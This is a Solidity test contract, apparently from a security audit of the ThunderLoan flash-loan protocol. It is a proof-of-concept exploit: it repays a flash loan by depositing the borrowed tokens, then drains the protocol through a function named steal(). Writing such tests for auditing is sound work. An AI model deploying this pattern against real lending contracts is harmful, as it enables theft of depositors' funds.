// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";

contract MockFlash3 {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;
    ERC20Mock tokenA;
    AssetToken assetToken;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan, ERC20Mock token) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        tokenA = token;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
        // if (initiator != s_owner) {
        //  revert MockFlashLoanReceiver__onlyOwner();
        //}
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        tokenA.approve(s_thunderLoan, amount + fee);
        ThunderLoan(s_thunderLoan).deposit(tokenA, amount + fee);

        ///////////////////////////////////////////////////////////

        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function steal() public {
        assetToken = ThunderLoan(s_thunderLoan).getAssetFromToken(tokenA);

        ThunderLoan(s_thunderLoan).redeem(tokenA, assetToken.balanceOf(address(this)));
    }

    function getBalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}
